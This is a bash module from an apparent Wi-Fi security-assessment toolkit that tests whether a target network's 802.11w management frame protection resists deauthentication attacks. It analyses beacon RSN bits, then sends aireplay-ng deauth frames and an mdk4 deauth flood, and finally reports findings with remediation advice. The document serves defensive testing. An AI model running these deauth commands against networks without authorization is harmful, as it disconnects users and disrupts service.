#!/usr/bin/env bash
# MODULE_META
# NAME="Deauth Resilience (802.11w/MFP)"
# CATEGORY="E"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,mdk4"
# DESC="Test 802.11w MFP protection and deauthentication attack resilience"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

set -uo pipefail

#===============================================================================
#  modules/e3_deauth_resilience.sh
#  E3: Deauthentication Resilience (802.11w / MFP)
#
#  PURPOSE:
#    Test if the target network is resilient to deauthentication attacks.
#    Check for 802.11w (Management Frame Protection / MFP) support and
#    verify if deauth frames actually disconnect clients.
#
#  TOOLS: ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[tshark]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - e3_beacon_analysis.txt      (802.11w capability analysis)
#    - e3_deauth_capture.pcap      (deauth frame capture)
#    - e3_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - mfp_advertised: bool — AP advertises 802.11w support
#    - mfp_required: bool — AP requires 802.11w (not optional)
#    - deauth_effective: bool — deauth actually disconnected clients
#    - deauth_method: string — tool used for testing
#===============================================================================

run_e3() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e3"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "E3" || return 1

    local has_mdk4=false
    local has_aireplay=false
    local has_tshark=false

    command -v mdk4 &>/dev/null && has_mdk4=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true
    command -v tshark &>/dev/null && has_tshark=true

    if [[ "$has_mdk4" == "false" && "$has_aireplay" == "false" ]]; then
        log_error "Either mdk4 or aireplay-ng is required."
        return 1
    fi

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ DEAUTHENTICATION RESILIENCE TEST ★                           ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will:                                                   ║"
    echo "  ║    • Check if AP advertises 802.11w (MFP) protection              ║"
    echo "  ║    • Send deauth frames to test if clients get disconnected       ║"
    echo "  ║    • Optionally test broadcast deauth flood (with mdk4)           ║"
    echo "  ║                                                                    ║"
    echo "  ║  This WILL temporarily disrupt clients if MFP is not enabled.    ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with deauth resilience test? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local mfp_advertised="false"
    local mfp_required="false"
    local deauth_effective="false"
    local deauth_method="none"
    local findings_file="${evidence_prefix}_findings.txt"
    local beacon_file="${evidence_prefix}_beacon_analysis.txt"

    {
        echo "============================================================"
        echo "  E3: Deauthentication Resilience Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Enable monitor mode and analyze beacons ---
    log_step 2 $total_steps "Analyzing AP beacon for 802.11w/MFP capabilities"
    update_tc_progress 2 $total_steps "Beacon analysis"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    # Set channel
    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    {
        echo "============================================================"
        echo "  802.11w / MFP Beacon Analysis"
        echo "  Target: ${GUEST_BSSID}"
        echo "============================================================"
        echo ""
    } > "$beacon_file"

    if [[ "$has_tshark" == "true" ]]; then
        # Capture a few beacons and check RSN capabilities
        local beacon_pcap="$TMP_DIR/e3_beacon.pcap"
        timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 20 -w "$beacon_pcap" \
            "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true

        if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
            ensure_user_ownership "$beacon_pcap"
            # Check for RSN capabilities — MFP bits
            local rsn_caps
            local rsn_caps=$(run_as_user tshark -r "$beacon_pcap" \
                -Y "wlan.bssid == ${GUEST_BSSID}" \
                -T fields \
                -e wlan.rsn.capabilities \
                -e wlan.rsn.capabilities.mfpc \
                -e wlan.rsn.capabilities.mfpr \
                2>/dev/null | head -1 || true)

            if [[ -n "$rsn_caps" ]]; then
                local mfpc mfpr
                local mfpc=$(echo "$rsn_caps" | awk -F'\t' '{print $2}')
                local mfpr=$(echo "$rsn_caps" | awk -F'\t' '{print $3}')

                echo "RSN Capabilities: ${rsn_caps}" >> "$beacon_file"

                if [[ "$mfpc" == "1" ]]; then
                    mfp_advertised="true"
                    echo "802.11w MFP Capable: YES" >> "$beacon_file"
                    log_success "AP advertises 802.11w MFP support (capable)"
                else
                    echo "802.11w MFP Capable: NO" >> "$beacon_file"
                    log_info "AP does NOT advertise 802.11w MFP support"
                fi

                if [[ "$mfpr" == "1" ]]; then
                    mfp_required="true"
                    echo "802.11w MFP Required: YES" >> "$beacon_file"
                    log_success "AP REQUIRES 802.11w MFP (strongest protection)"
                else
                    echo "802.11w MFP Required: NO" >> "$beacon_file"
                fi
            else
                log_info "Could not parse RSN capabilities from beacon"
                echo "RSN capabilities not detected in beacon" >> "$beacon_file"
            fi

            # Also check encryption type
            local encryption
            local encryption=$(run_as_user tshark -r "$beacon_pcap" \
                -Y "wlan.bssid == ${GUEST_BSSID}" \
                -T fields \
                -e wlan.rsn.akms.type \
                2>/dev/null | head -1 || true)

            echo "AKM Suite Type: ${encryption:-unknown}" >> "$beacon_file"

            # Check for WPA3-SAE
            if echo "$encryption" | grep -q "8"; then
                echo "WPA3-SAE Detected: YES" >> "$beacon_file"
                log_success "WPA3-SAE detected — includes built-in MFP"
                mfp_advertised="true"
            fi
        fi
        rm -f "$beacon_pcap"
    else
        log_info "tshark not available — skipping detailed beacon analysis"
        echo "NOTE: tshark not available for beacon analysis" >> "$beacon_file"
    fi

    #--- Step 3: Pre-test connectivity baseline ---
    log_step 3 $total_steps "Establishing connectivity baseline"
    update_tc_progress 3 $total_steps "Baseline"

    check_abort || return 1

    # Monitor for deauth responses and client disconnections
    local deauth_pcap="${evidence_prefix}_deauth_capture.pcap"
    spawn_bg "e3_tcpdump" "tcpdump" -i "$mon_iface" -w "$deauth_pcap" \
        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype probe-req"

    # Count baseline probe requests (10 seconds)
    sleep 10
    local baseline_probes=0
    if [[ "$has_tshark" == "true" ]]; then
        ensure_user_ownership "$deauth_pcap"
        baseline_probes=$(run_as_user tshark -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l || true)
    fi

    #--- Step 4: Deauth attack ---
    log_step 4 $total_steps "Sending deauthentication frames"
    update_tc_progress 4 $total_steps "Deauth attack"

    check_abort || return 1

    local can_inject=false
    if [[ "${HW_CAN_INJECT:-no}" == "yes" ]]; then
        can_inject=true
    else
        log_info "Verifying hardware injection capability..."
        if validate_injection "$mon_iface"; then
            can_inject=true
            HW_CAN_INJECT="yes"
        fi
    fi

    if [[ "$can_inject" == "true" ]]; then
        if [[ "$has_aireplay" == "true" ]]; then
            deauth_method="aireplay-ng"
            # Send targeted deauth
            run_fg "aireplay-ng" --deauth 20 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
            echo "Sent 20 targeted deauth frames via aireplay-ng" >> "$findings_file"

            sleep 5

            # Send broadcast deauth
            run_fg "aireplay-ng" --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
            echo "Sent 10 broadcast deauth frames via aireplay-ng" >> "$findings_file"
        fi

        if [[ "$has_mdk4" == "true" ]]; then
            deauth_method="${deauth_method:+${deauth_method}+}mdk4"

            # mdk4 deauth mode — brief burst
            timeout 15 run_fg "mdk4" "$mon_iface" d \
                -B "$GUEST_BSSID" \
                -c "${GUEST_CHANNEL:-0}" &>/dev/null || true

            echo "Ran mdk4 deauth flood for 15 seconds" >> "$findings_file"
        fi
    else
        log_warn "Hardware injection not available. Cannot perform active deauthentication test."
        echo "SKIPPED: Active testing skipped due to hardware injection limitations." >> "$findings_file"
    fi

    #--- Step 5: Measure impact ---
    log_step 5 $total_steps "Measuring deauth impact"
    update_tc_progress 5 $total_steps "Analyzing"

    # Wait for client re-association attempts
    start_countdown 20 "Monitoring for client re-association after deauth"
    sleep 20
    stop_countdown

    # Stop capture
    stop_process "e3_tcpdump"
    validate_pcap "$deauth_pcap" "Deauth test capture"

    # Analyze the capture
    if [[ "$has_tshark" == "true" && -f "$deauth_pcap" ]]; then
        ensure_user_ownership "$deauth_pcap"
        # Count post-deauth probe requests (indicate clients disconnected and are searching)
        local post_probes
        post_probes=$(run_as_user tshark -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
        post_probes=${post_probes:-0}

        # Count deauth frames seen (from AP — could be countermeasure)
        local deauth_from_ap
        deauth_from_ap=$(run_as_user tshark -r "$deauth_pcap" \
            -Y "wlan.fc.type_subtype == 0x0c and wlan.sa == ${GUEST_BSSID}" \
            2>/dev/null | wc -l) || true
        deauth_from_ap=${deauth_from_ap:-0}

        echo "" >> "$findings_file"
        echo "Post-attack analysis:" >> "$findings_file"
        echo "  Baseline probe requests (10s): ${baseline_probes}" >> "$findings_file"
        echo "  Post-deauth probe requests:     ${post_probes}" >> "$findings_file"
        echo "  Deauth frames from AP:          ${deauth_from_ap}" >> "$findings_file"

        # If probe requests spiked after deauth, clients were affected
        if [[ $post_probes -gt $((baseline_probes + 5)) ]]; then
            deauth_effective="true"
            log_result "FINDING" "Deauth attack was effective — client probe requests spiked (${baseline_probes} → ${post_probes})"
            echo "FINDING: Deauth effective — probe request spike detected" >> "$findings_file"
        else
            log_info "No significant probe request spike — deauth may have been blocked"
            echo "INFO: No significant change in probe requests after deauth" >> "$findings_file"
        fi
    fi

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$mfp_required" == "true" && "$deauth_effective" == "false" ]]; then
        result_summary="Network is protected against deauthentication attacks. 802.11w MFP is required and deauth frames were ineffective."
        recommendations="No action needed. MFP is properly configured."
    elif [[ "$mfp_advertised" == "true" && "$deauth_effective" == "false" ]]; then
        result_summary="Network appears resilient to deauth attacks. 802.11w MFP is advertised (optional) and deauths were not effective."
        recommendations="Consider making MFP required (not optional) for maximum protection."
    elif [[ "$deauth_effective" == "true" ]]; then
        result_status="FINDING"
        if [[ "$mfp_advertised" == "true" ]]; then
            result_summary="Deauthentication attacks are effective despite 802.11w MFP being advertised. MFP may be optional and not enforced by all clients."
            recommendations="1) Set 802.11w MFP to REQUIRED (not optional). "
            recommendations+="2) Upgrade clients that do not support MFP. "
            recommendations+="3) Deploy WIDS to detect deauthentication floods."
        else
            result_summary="Network is VULNERABLE to deauthentication attacks. 802.11w MFP is NOT enabled. Clients can be disconnected at will."
            recommendations="1) Enable 802.11w (MFP / PMF) on all SSIDs — set to REQUIRED. "
            recommendations+="2) Consider upgrading to WPA3-SAE which mandates MFP. "
            recommendations+="3) Deploy WIDS/WIPS to detect and alert on deauthentication floods. "
            recommendations+="4) Ensure all client devices support 802.11w."
        fi
    else
        result_summary="802.11w MFP is not advertised, but deauth effectiveness could not be confirmed. Manual verification recommended."
        recommendations="Enable 802.11w MFP and re-test."
    fi

    evidence_register_file "$beacon_file"
    evidence_register_file "$deauth_pcap"
    evidence_register_file "$findings_file"

    local result_json
    result_json=$(run_fg "jq" -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "MFP advertised: ${mfp_advertised}, MFP required: ${mfp_required}, Deauth effective: ${deauth_effective}, Method: ${deauth_method}" \
        --arg recommendations "$recommendations" \
        --arg mfp_advertised "$mfp_advertised" \
        --arg mfp_required "$mfp_required" \
        --arg deauth_effective "$deauth_effective" \
        --arg deauth_method "$deauth_method" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            mfp_advertised: ($mfp_advertised == "true"),
            mfp_required: ($mfp_required == "true"),
            deauth_effective: ($deauth_effective == "true"),
            deauth_method: $deauth_method
        }')

    local has_tool_output=0
    [[ -f "$findings_file" || -f "$beacon_file" ]] && has_tool_output=1

    local has_primary=0
    [[ -f "$deauth_pcap" ]] && has_primary=1

    local is_secure_claim=0
    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1

    save_tc_result "E3" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
    save_session_state

    # Display summary
    echo ""
    if [[ "$deauth_effective" == "true" ]]; then
        log_result "FINDING" "Deauth attacks are effective — 802.11w MFP: $(if [[ "$mfp_advertised" == "true" ]]; then echo "advertised but not effective"; else echo "NOT enabled"; fi)"
    else
        log_result "SECURE" "Network is resilient to deauth — MFP: $(if [[ "$mfp_required" == "true" ]]; then echo "REQUIRED"; elif [[ "$mfp_advertised" == "true" ]]; then echo "advertised"; else echo "status unclear"; fi)"
    fi

    return 0
}
